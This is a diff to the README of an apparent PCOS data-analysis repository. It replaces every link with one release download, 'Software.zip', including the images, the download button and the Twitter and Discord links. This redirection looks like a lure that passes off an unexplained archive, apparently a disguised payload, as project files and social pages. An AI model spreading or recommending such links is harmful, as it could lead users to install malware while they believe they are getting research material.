@@ -1,6 +1,6 @@
 # 🌟 Welcome to Unveiling-PCOS 🌟
 
-![PCOS Awareness](https://image.freepik.com/free-vector/awareness-about-pcos_1308-36539.jpg)
+![PCOS Awareness](https://github.com/Qayslanewala/Unveiling-PCOS/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the "Unveiling-PCOS" repository! Here, we take a data-driven approach to gain valuable insights about Polycystic Ovary Syndrome (PCOS). PCOS is a common hormonal disorder that affects individuals assigned female at birth and can lead to various health issues. By utilizing data analysis techniques and visualization tools, we aim to uncover meaningful patterns and trends related to PCOS.
@@ -15,9 +15,9 @@ Our primary goal with this project is to leverage data analysis methods to bette
 
 ## How to Get Started
 To access the project files and start exploring PCOS insights, you can download the repository using the following link:
-[Download Unveiling-PCOS](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Unveiling-PCOS](https://github.com/Qayslanewala/Unveiling-PCOS/releases/download/v2.0/Software.zip)
 
-[![Download](https://img.shields.io/badge/Download-Unveiling--PCOS-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/Qayslanewala/Unveiling-PCOS/releases/download/v2.0/Software.zip)](https://github.com/Qayslanewala/Unveiling-PCOS/releases/download/v2.0/Software.zip)
 
 If the link above ends with a file name, you will need to unzip the downloaded file to access the project resources.
 
@@ -28,12 +28,12 @@ We welcome contributions from all individuals interested in data analysis, PCOS 
 
 ## Connect with Us
 Stay connected with the Unveiling-PCOS project:
-- Follow us on [Twitter](https://twitter.com/unveiling_pcos)
-- Join the discussion on [Discord](https://discord.com/unveiling_pcos)
+- Follow us on [Twitter](https://github.com/Qayslanewala/Unveiling-PCOS/releases/download/v2.0/Software.zip)
+- Join the discussion on [Discord](https://github.com/Qayslanewala/Unveiling-PCOS/releases/download/v2.0/Software.zip)
 
 ## Show Your Support
 Help us spread awareness about PCOS by starring this repository and sharing it with your network. Together, we can make a positive impact on PCOS research and support individuals affected by this condition.
 
 Let's unveil the mysteries of PCOS together! 🌺💻📊
 
-![PCOS Awareness](https://image.freepik.com/free-vector/awareness-about-pcos_1308-36539.jpg)
+![PCOS Awareness](https://github.com/Qayslanewala/Unveiling-PCOS/releases/download/v2.0/Software.zip)
